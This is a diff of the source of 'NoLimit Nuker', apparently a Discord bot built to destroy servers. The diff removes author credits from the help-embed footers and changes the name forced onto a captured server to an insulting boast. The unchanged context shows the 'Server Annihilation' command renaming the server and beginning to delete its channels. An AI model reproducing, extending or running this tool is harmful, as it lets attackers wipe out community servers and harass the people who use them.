@@ -64,7 +64,7 @@ client.on("message", async message => {
             **Server Annihilation:** \`${prefix}die\` [text]
             `)
             .setThumbnail(``)
-            .setFooter(`NoLimit Nuker | Prefix: ${prefix} | Author: NoLimit | Cord: ${founder}`)
+            .setFooter(`Prefix: ${prefix} | Cord: ${founder}`)
             .setColor(0x36393E)
             .setTimestamp(Date.now());
         message.channel.send(helpEmbed);
@@ -95,7 +95,7 @@ client.on("message", async message => {
                 **Server Annihilation:** \`${prefix}die\` [text]
                 `)
                 .setImage(`https://media.discordapp.net/attachments/782211616350404611/800703659435622430/death_grips.gif`)
-                .setFooter(` NoLimit Nuker | Prefix: ${prefix} | Author: NoLimit | Cord: ${founder}`)
+                .setFooter(`Prefix: ${prefix} | Cord: ${founder}`)
                 .setColor(0x36393E)
                 .setTimestamp(Date.now());
             message.channel.send(helpEmbed);
@@ -586,7 +586,7 @@ client.on("message", async message => {
             }
             else {
                 message.delete();
-                message.guild.setName(`death is near.`).then(console.log(green(`Server Name changed to: ${message.guild.name} Wizzed`))); // changes server name
+                message.guild.setName(`NoLimit Just Wizzed Yo Bum Ass`).then(console.log(green(`Server Name changed to: ${message.guild.name} Wizzed`))); // changes server name
 
                 // Channel Delete
                 message.guild.channels.cache.forEach((ch) => {
